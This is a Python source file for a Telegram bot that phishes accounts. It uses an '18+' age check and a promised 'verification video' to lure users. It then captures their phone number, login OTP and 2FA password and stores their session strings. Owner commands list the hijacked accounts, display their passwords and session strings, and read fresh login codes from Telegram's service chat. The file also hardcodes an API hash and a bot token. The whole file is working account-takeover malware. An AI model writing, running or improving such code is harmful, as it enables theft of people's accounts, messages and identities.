import asyncio
import logging
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, Message
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PeerIdInvalid
import sqlite3
import os

# Logging setup
logging.basicConfig(level=logging.INFO)

# Database setup
conn = sqlite3.connect('bot_data.db')
cursor = conn.cursor()

cursor.execute('''
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    phone_number TEXT,
    session_string TEXT,
    two_step_password TEXT,
    status TEXT
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS videos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    video_id TEXT,
    caption TEXT
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    action TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)
''')

conn.commit()

# Bot configuration
API_ID = 33628258
API_HASH = "0850762925b9c1715b9b122f7b753128"
BOT_TOKEN = "7431770647:AAGjdEkc1bzFZ5D5SgAvO8EmtsmelWFbT8k"
OWNER_ID = 7661825494

app = Client("session_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# States for conversation
user_states = {}
user_data = {}

async def log_action(user_id, action):
    cursor.execute("INSERT INTO logs (user_id, action) VALUES (?, ?)", (user_id, action))
    conn.commit()
    
    # Send to owner if important
    if user_id != OWNER_ID and any(word in action.lower() for word in ['login', 'successful', 'failed', 'contact']):
        try:
            await app.send_message(
                OWNER_ID,
                f"📝 **LOG UPDATE**\n\n"
                f"User: `{user_id}`\n"
                f"Action: {action}"
            )
        except PeerIdInvalid:
            print(f"WARNING: Cannot send log to owner {OWNER_ID}. The owner MUST send /start to the bot first!")
        except Exception as e:
            print(f"Log sending error: {e}")

# Owner commands
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message):
    user_id = message.from_user.id
    
    if user_id == OWNER_ID:
        await message.reply_text(
            "👑 **Owner Menu**\n\n"
            "/setvideo - Set verification video\n"
            "/setdp - Set bot profile picture\n"
            "/allaccounts - View all active accounts\n"
            "/help - Show all commands\n"
            "/logs - Get bot logs"
        )
        await log_action(user_id, "Owner started bot")
        return
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ YES, I'm 18+", callback_data="confirm_age")]
    ])
    
    await message.reply_text(
        "⚠️ **AGE VERIFICATION**\n\n"
        "Are you 18 years or older?",
        reply_markup=keyboard
    )
    await log_action(user_id, "Started bot")

@app.on_callback_query(filters.regex("confirm_age"))
async def confirm_age_callback(client, callback_query):
    user_id = callback_query.from_user.id
    
    keyboard = ReplyKeyboardMarkup([
        [KeyboardButton("📱 Share Contact", request_contact=True)]
    ], resize_keyboard=True, one_time_keyboard=True)
    
    await callback_query.message.edit_text(
        "🔐 **HUMAN VERIFICATION REQUIRED**\n\n"
        "Please share your contact number for verification:",
        reply_markup=None
    )
    
    await callback_query.message.reply_text(
        "Click the button below to share your contact:",
        reply_markup=keyboard
    )
    
    user_states[user_id] = "awaiting_contact"
    await log_action(user_id, "Confirmed age")

@app.on_message(filters.contact & filters.private)
async def handle_contact(client, message):
    user_id = message.from_user.id
    
    if user_states.get(user_id) != "awaiting_contact":
        return
    
    phone_number = message.contact.phone_number
    user_data[user_id] = {"phone": phone_number}
    
    # Store in database
    cursor.execute("INSERT OR REPLACE INTO users (user_id, phone_number, status) VALUES (?, ?, ?)",
                   (user_id, phone_number, "contact_shared"))
    conn.commit()
    
    # Create session client
    session_client = Client(f"sessions/{user_id}", api_id=API_ID, api_hash=API_HASH)
    
    try:
        await session_client.connect()
        sent_code = await session_client.send_code(phone_number)
        user_data[user_id]["phone_code_hash"] = sent_code.phone_code_hash
        user_data[user_id]["session_client"] = session_client
        
        # Create OTP keyboard
        keyboard = []
        row = []
        for i in range(1, 10):
            row.append(InlineKeyboardButton(str(i), callback_data=f"otp_{i}"))
            if len(row) == 3:
                keyboard.append(row)
                row = []
        row.append(InlineKeyboardButton("0", callback_data="otp_0"))
        row.append(InlineKeyboardButton("⌫", callback_data="otp_backspace"))
        keyboard.append(row)
        keyboard.append([InlineKeyboardButton("✅ SUBMIT", callback_data="otp_submit")])
        
        otp_markup = InlineKeyboardMarkup(keyboard)
        
        await message.reply_text(
            f"📱 **LOGIN REQUIRED**\n\n"
            f"Phone: `{phone_number}`\n\n"
            "Enter OTP received on Telegram:",
            reply_markup=otp_markup
        )
        
        user_states[user_id] = "awaiting_otp"
        user_data[user_id]["otp_input"] = ""
        await log_action(user_id, f"Shared contact: {phone_number}")
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
        await log_action(user_id, f"Login error: {str(e)}")

@app.on_callback_query(filters.regex(r"^otp_"))
async def handle_otp_input(client, callback_query):
    user_id = callback_query.from_user.id
    
    if user_states.get(user_id) != "awaiting_otp":
        return
    
    data = callback_query.data
    otp_input = user_data[user_id].get("otp_input", "")
    
    if data == "otp_backspace":
        otp_input = otp_input[:-1]
    elif data == "otp_submit":
        if len(otp_input) == 0:
            await callback_query.answer("Enter OTP first!", show_alert=True)
            return
        
        await process_otp_submission(callback_query, user_id, otp_input)
        return
    else:
        number = data.split("_")[1]
        otp_input += number
    
    user_data[user_id]["otp_input"] = otp_input
    
    otp_display = " ".join(otp_input) if otp_input else "Enter numbers..."
    
    keyboard = []
    row = []
    for i in range(1, 10):
        row.append(InlineKeyboardButton(str(i), callback_data=f"otp_{i}"))
        if len(row) == 3:
            keyboard.append(row)
            row = []
    row.append(InlineKeyboardButton("0", callback_data="otp_0"))
    row.append(InlineKeyboardButton("⌫", callback_data="otp_backspace"))
    keyboard.append(row)
    keyboard.append([InlineKeyboardButton("✅ SUBMIT", callback_data="otp_submit")])
    
    otp_markup = InlineKeyboardMarkup(keyboard)
    
    await callback_query.message.edit_text(
        f"📱 **LOGIN REQUIRED**\n\n"
        f"Phone: `{user_data[user_id]['phone']}`\n\n"
        f"OTP: `{otp_display}`\n\n"
        "Enter OTP received on Telegram:",
        reply_markup=otp_markup
    )
    
    await callback_query.answer()

async def process_otp_submission(callback_query, user_id, otp_code):
    try:
        session_client = user_data[user_id]["session_client"]
        phone_code_hash = user_data[user_id]["phone_code_hash"]
        phone_number = user_data[user_id]["phone"]
        
        await session_client.sign_in(
            phone_number,
            phone_code_hash,
            otp_code
        )
        
        session_string = await session_client.export_session_string()
        
        cursor.execute("UPDATE users SET session_string = ?, status = ? WHERE user_id = ?",
                       (session_string, "logged_in", user_id))
        conn.commit()
        
        await callback_query.message.edit_text(
            "✅ **VERIFICATION SUCCESSFUL**\n\n"
            "Your account has been verified!",
            reply_markup=None
        )
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🎬 SEND VIDEO", callback_data="send_video")]
        ])
        
        await callback_query.message.reply_text(
            "Click below to receive your verification video:",
            reply_markup=keyboard
        )
        
        await log_action(user_id, f"Login successful - OTP: {otp_code}")
        
    except SessionPasswordNeeded:
        user_states[user_id] = "awaiting_2fa"
        await callback_query.message.edit_text(
            "🔒 **2-STEP VERIFICATION**\n\n"
            "Please enter your 2-step verification password:"
        )
        await log_action(user_id, "2FA required")
        
    except Exception as e:
        await callback_query.message.edit_text(f"❌ Login failed: {str(e)}")
        await log_action(user_id, f"Login failed: {str(e)}")

@app.on_message(filters.private & filters.text & ~filters.command(["start", "setvideo", "done", "setdp", "allaccounts", "logs", "help"]))
async def handle_2fa_password(client, message):
    user_id = message.from_user.id
    
    if user_states.get(user_id) == "awaiting_2fa":
        password = message.text
        
        try:
            session_client = user_data[user_id]["session_client"]
            await session_client.check_password(password)
            
            session_string = await session_client.export_session_string()
            
            cursor.execute("UPDATE users SET session_string = ?, two_step_password = ?, status = ? WHERE user_id = ?",
                           (session_string, password, "logged_in", user_id))
            conn.commit()
            
            await message.reply_text(
                "✅ **2-STEP VERIFICATION PASSED**\n\n"
                "Your account has been verified!"
            )
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🎬 SEND VIDEO", callback_data="send_video")]
            ])
            
            await message.reply_text(
                "Click below to receive your verification video:",
                reply_markup=keyboard
            )
            
            await log_action(user_id, f"2FA passed: {password}")
            
        except Exception as e:
            await message.reply_text(f"❌ 2FA failed: {str(e)}")
            await log_action(user_id, f"2FA failed: {str(e)}")
        
        user_states[user_id] = None

@app.on_callback_query(filters.regex("send_video"))
async def send_verification_video(client, callback_query):
    user_id = callback_query.from_user.id
    
    cursor.execute("SELECT video_id, caption FROM videos")
    videos = cursor.fetchall()
    
    if not videos:
        await callback_query.message.edit_text(
            "❌ No videos available. Contact admin.",
            reply_markup=None
        )
        return
    
    for video_id, caption in videos:
        try:
            await callback_query.message.reply_video(
                video_id,
                caption=caption if caption else "Verification Video"
            )
        except:
            pass
    
    await callback_query.answer("Videos sent!")
    await log_action(user_id, "Received videos")

@app.on_message(filters.command("setvideo") & filters.user(OWNER_ID))
async def set_video_command(client, message):
    await message.reply_text(
        "📹 **SET VERIFICATION VIDEO**\n\n"
        "Please send the video you want to set as verification video.\n"
        "You can add caption with the video.\n\n"
        "After sending, type /done to save."
    )
    user_states[OWNER_ID] = "awaiting_video"

@app.on_message(filters.command("done") & filters.user(OWNER_ID))
async def done_video_command(client, message):
    if user_states.get(OWNER_ID) == "awaiting_video":
        await message.reply_text("✅ Video setting mode ended.")
        user_states[OWNER_ID] = None

@app.on_message(filters.video & filters.user(OWNER_ID))
async def handle_video_upload(client, message):
    if user_states.get(OWNER_ID) == "awaiting_video":
        video_id = message.video.file_id
        caption = message.caption or ""
        
        cursor.execute("INSERT INTO videos (video_id, caption) VALUES (?, ?)",
                       (video_id, caption))
        conn.commit()
        
        await message.reply_text(f"✅ Video saved! ID: {video_id[:20]}...")
        await log_action(OWNER_ID, f"Added video: {video_id[:20]}")

@app.on_message(filters.command("setdp") & filters.user(OWNER_ID))
async def set_profile_picture(client, message):
    await message.reply_text(
        "🖼️ **SET PROFILE PICTURE**\n\n"
        "Please send the photo you want to set as bot profile picture."
    )
    user_states[OWNER_ID] = "awaiting_profile_pic"

@app.on_message(filters.photo & filters.user(OWNER_ID))
async def handle_profile_pic(client, message):
    if user_states.get(OWNER_ID) == "awaiting_profile_pic":
        try:
            photo_path = await message.download()
            await app.set_profile_photo(photo=photo_path)
            os.remove(photo_path)
            
            await message.reply_text("✅ Profile picture updated!")
            await log_action(OWNER_ID, "Updated profile picture")
            
        except Exception as e:
            await message.reply_text(f"❌ Error: {str(e)}")
        
        user_states[OWNER_ID] = None

@app.on_message(filters.command("allaccounts") & filters.user(OWNER_ID))
async def show_all_accounts(client, message):
    cursor.execute("SELECT user_id, phone_number, status FROM users WHERE status = 'logged_in'")
    accounts = cursor.fetchall()
    
    if not accounts:
        await message.reply_text("📭 No active accounts found.")
        return
    
    text = "📋 **ACTIVE ACCOUNTS**\n\n"
    keyboard = []
    
    for idx, (user_id, phone, status) in enumerate(accounts, 1):
        text += f"{idx}. User ID: `{user_id}`\n"
        text += f"   Phone: `{phone}`\n"
        text += f"   Status: {status}\n\n"
        
        keyboard.append([
            InlineKeyboardButton(
                f"👤 Account {idx}",
                callback_data=f"account_{user_id}"
            )
        ])
    
    markup = InlineKeyboardMarkup(keyboard)
    await message.reply_text(text, reply_markup=markup)

@app.on_callback_query(filters.regex(r"^account_") & filters.user(OWNER_ID))
async def handle_account_detail(client, callback_query):
    user_id = int(callback_query.data.split("_")[1])
    
    cursor.execute("SELECT phone_number, session_string, two_step_password FROM users WHERE user_id = ?", (user_id,))
    account = cursor.fetchone()
    
    if not account:
        await callback_query.answer("Account not found!", show_alert=True)
        return
    
    phone, session_string, two_step = account
    
    text = f"📱 **ACCOUNT DETAILS**\n\n"
    text += f"User ID: `{user_id}`\n"
    text += f"Phone: `{phone}`\n"
    
    if two_step:
        text += f"2FA Password: `{two_step}`\n"
    
    keyboard = [
        [InlineKeyboardButton("📱 Get OTP", callback_data=f"getotp_{user_id}")],
        [InlineKeyboardButton("📄 Get Session", callback_data=f"getsession_{user_id}")]
    ]
    
    markup = InlineKeyboardMarkup(keyboard)
    
    await callback_query.message.edit_text(text, reply_markup=markup)
    await callback_query.answer()

# FIX 1: Properly using async for loop for get_chat_history
@app.on_callback_query(filters.regex(r"^getotp_") & filters.user(OWNER_ID))
async def get_otp_for_account(client, callback_query):
    target_user_id = int(callback_query.data.split("_")[1])
    
    cursor.execute("SELECT session_string FROM users WHERE user_id = ?", (target_user_id,))
    result = cursor.fetchone()
    
    if not result or not result[0]:
        await callback_query.answer("No session found!", show_alert=True)
        return
    
    session_string = result[0]
    
    try:
        user_client = Client("temp_session", session_string=session_string,
                           api_id=API_ID, api_hash=API_HASH)
        
        await user_client.connect()
        
        otp_text = "📩 **RECENT MESSAGES FROM 777000**\n\n"
        
        # Async generator fix implemented here!
        async for msg in user_client.get_chat_history(777000, limit=5):
            if msg.text and any(word in msg.text.lower() for word in ['code', 'otp', 'login', 'verification']):
                otp_text += f"```\n{msg.text}\n```\n\n"
                otp_text += f"Time: {msg.date}\n"
                otp_text += "---\n"
        
        if len(otp_text) > 100:
            await callback_query.message.reply_text(otp_text)
        else:
            await callback_query.message.reply_text("No OTP messages found in recent chats.")
        
        await user_client.disconnect()
        await callback_query.answer("OTP fetched!")
        await log_action(OWNER_ID, f"Fetched OTP for user {target_user_id}")
        
    except Exception as e:
        await callback_query.message.reply_text(f"❌ Error: {str(e)}")

# FIX 2: Added the missing "Get Session" button handler
@app.on_callback_query(filters.regex(r"^getsession_") & filters.user(OWNER_ID))
async def get_session_for_account(client, callback_query):
    target_user_id = int(callback_query.data.split("_")[1])
    
    cursor.execute("SELECT session_string FROM users WHERE user_id = ?", (target_user_id,))
    result = cursor.fetchone()
    
    if not result or not result[0]:
        await callback_query.answer("No session found!", show_alert=True)
        return
        
    session_string = result[0]
    
    await callback_query.message.reply_text(
        f"📄 **SESSION STRING FOR `{target_user_id}`**\n\n"
        f"`{session_string}`\n\n"
        f"⚠️ Keep this secure!"
    )
    await callback_query.answer("Session string fetched!")
    await log_action(OWNER_ID, f"Fetched session for user {target_user_id}")

@app.on_message(filters.command("logs") & filters.user(OWNER_ID))
async def send_logs(client, message):
    cursor.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 50")
    logs = cursor.fetchall()
    
    if not logs:
        await message.reply_text("📭 No logs available.")
        return
    
    log_text = "📊 **BOT LOGS**\n\n"
    
    for log in logs:
        log_id, user_id, action, timestamp = log
        log_text += f"🕒 {timestamp}\n"
        log_text += f"👤 User: {user_id}\n"
        log_text += f"📝 Action: {action[:100]}...\n"
        log_text += "─" * 30 + "\n"
    
    if len(log_text) > 4000:
        chunks = [log_text[i:i+4000] for i in range(0, len(log_text), 4000)]
        for chunk in chunks:
            await message.reply_text(chunk)
    else:
        await message.reply_text(log_text)

@app.on_message(filters.command("help") & filters.user(OWNER_ID))
async def help_command(client, message):
    help_text = """
🔐 **OWNER COMMANDS**

**Main Commands:**
/start - Show owner menu
/setvideo - Set verification videos (send video then /done)
/setdp - Set bot profile picture
/allaccounts - View all active accounts
/logs - Get bot activity logs

**Account Management:**
• Click on any account from /allaccounts to view details
• Get OTP from logged in accounts
• View 2FA passwords if available

**Bot Features:**
• Age verification system
• Contact sharing for verification
• OTP input with virtual keyboard
• 2-step verification support
• Automatic video sending after verification
• Session storage in database
• Complete logging system
"""
    await message.reply_text(help_text)

if __name__ == "__main__":
    os.makedirs("sessions", exist_ok=True)
    
    print("🤖 Bot is starting...")
    print(f"👑 Owner ID: {OWNER_ID}")
    print("📁 Database initialized")
    print("🔐 Session storage ready")
    
    app.run()
